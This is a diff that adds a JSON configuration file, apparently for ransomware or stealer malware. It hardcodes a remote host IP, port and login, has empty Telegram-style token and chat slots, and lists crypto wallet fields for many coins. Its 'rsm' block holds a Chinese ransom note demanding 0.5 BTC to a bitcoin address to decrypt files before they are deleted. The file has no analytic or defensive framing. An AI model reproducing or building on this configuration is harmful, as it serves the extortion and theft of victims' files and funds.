@@ -1,0 +1,67 @@
+{
+  "def": {
+    "user": "WUZEN",
+    "lang": "中文",
+    "lcode": "zh",
+    "password": "WUZEN",
+    "host": "103.250.172.43",
+    "port": "3000"
+  },
+  "groups": {
+    "m": {
+      "token": "",
+      "chatId": ""
+    },
+    "n": {
+      "token": "",
+      "chatId": ""
+    },
+    "kl": {
+      "token": "",
+      "chatId": ""
+    },
+    "sl": {
+      "token": "",
+      "chatId": ""
+    }
+  },
+  "langs": [
+    "中文",
+    "Русский",
+    "English",
+    "Español",
+    "Français",
+    "عربي"
+  ],
+  "settings": {
+    "config": {
+      "a": false,
+      "b": false,
+      "c": false,
+      "d": false,
+      "e": false,
+      "f": false
+    },
+    "crypto": {
+      "BTC": "",
+      "ETH": "",
+      "XRP": "",
+      "BNB": "",
+      "SOL": "",
+      "XLM": "",
+      "TON": "",
+      "BCH": "",
+      "ADA": "",
+      "TRX": "",
+      "LTC": "",
+      "ENY": "",
+      "DOGE": "",
+      "DASH": ""
+    },
+    "rsm": {
+      "title": "您的文件已被加密",
+      "text": "您的文件已被加密计时器停止后将被删除请向以下地址发送0.5 BTC以解密并取回您的文件",
+      "ad": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+    }
+  }
+}
